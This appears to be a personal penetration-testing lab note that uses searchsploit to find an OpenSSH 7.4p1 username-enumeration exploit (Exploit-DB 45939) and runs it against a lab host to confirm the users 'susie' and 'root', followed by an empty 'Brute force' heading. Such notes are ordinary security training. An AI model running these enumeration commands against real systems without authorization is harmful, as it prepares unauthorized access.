Attack Vector 1 - SSH

# Searchsploit
`searchsploit OpenSSH 7.4p1`
![9f85dad747df329368997e3b3b0af254.png](:/86c2f57b857647bd9004a9c09966fc99)

## 45939 Exploit
This exploit verifies usernames. We can verify that root and susie are valid login names.

`python 45939.py 10.11.1.146 susie`
![dbbdb355a362c19c7abcf8ac888531f5.png](:/de599586f1414bc29fcab8cb25f222d2)

`python 45939.py 10.11.1.146 root`
![7d72f91a432d94b0f345fcdd9414b329.png](:/6666bb37089a49deb36213408a189120)


# Brute force




id: cc868bb53ed840bbb3d18fe747a1dfed
parent_id: 905fd60ed3b1488db1f90a96122593e4
created_time: 2020-08-30T08:07:36.638Z
updated_time: 2020-09-03T22:18:19.299Z
is_conflict: 0
latitude: 0.00000000
longitude: 0.00000000
altitude: 0.0000
author: 
source_url: 
is_todo: 0
todo_due: 0
todo_completed: 0
source: joplin-desktop
source_application: net.cozic.joplin-desktop
application_data: 
order: 0
user_created_time: 2020-08-30T08:07:36.638Z
user_updated_time: 2020-09-03T22:18:19.299Z
encryption_cipher_text: 
encryption_applied: 0
markup_language: 1
is_shared: 0
type_: 1